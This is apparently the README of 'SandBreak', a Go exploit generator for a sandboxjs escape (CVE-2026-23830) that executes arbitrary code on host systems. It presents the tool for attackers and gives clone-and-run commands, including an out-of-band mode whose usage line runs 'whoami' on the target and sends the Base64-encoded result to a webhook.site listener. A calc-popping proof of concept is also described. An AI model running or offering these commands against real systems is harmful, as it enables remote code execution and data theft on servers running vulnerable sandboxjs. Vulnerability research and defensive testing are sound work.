**SandBreak** is a robust, Go-based exploit generator designed to leverage the **SandboxJS Escape vulnerability (CVE-2026-23830)**.

This tool exploits the unprotected `AsyncFunction` constructor in older versions of `sandboxjs`, allowing attackers to break out of the V8 sandbox environment and execute arbitrary code on the host system. It supports multiple payload modes including **Blind OOB Exfiltration**, **Defacement**, and **Error-Based RCE**.

---

## Features

- **2 Attack Modes:**
  - `oob`: Out-of-Band Data Exfiltration (HTTP/HTTPS) for blind scenarios.
  - `calc`: Pops `calc.exe` (Classic PoC).
- **Smart OOB:** Automatically detects HTTP vs HTTPS to prevent server crashes.
- **Go-Based:** Single binary, no dependencies required on the attacker machine.
- **Lightweight:** Generates pure, minified JavaScript payloads.

## Installation

Clone the repository and run:

```bash
git clone https://github.com/Galaxy-sc/SandBreak.git
cd SandBreak
go run CVE-2026-23830.go
```

---

## Usage

```bash
go run CVE-2026-23830.go -mode [MODE] -cmd [COMMAND] [OPTIONS]
```

### 1. OOB Mode (Blind RCE - Professional)
Use this when you have no output feedback. It executes the command and sends the Base64-encoded result to your listener (e.g., webhook.site).

```bash
go run CVE-2026-23830.go -mode oob -cmd "whoami" -url "https://webhook.site/YOUR-UUID"
```

*Successfully bypasses basic egress filtering crashes by handling network errors.*

### 2. Calc Mode (Local Test)
Pops a calculator on the Windows server.

```bash
go run CVE-2026-23830.go -mode calc
```

*Attacker receiving the server's user data via Webhook despite no visual output on the site.*
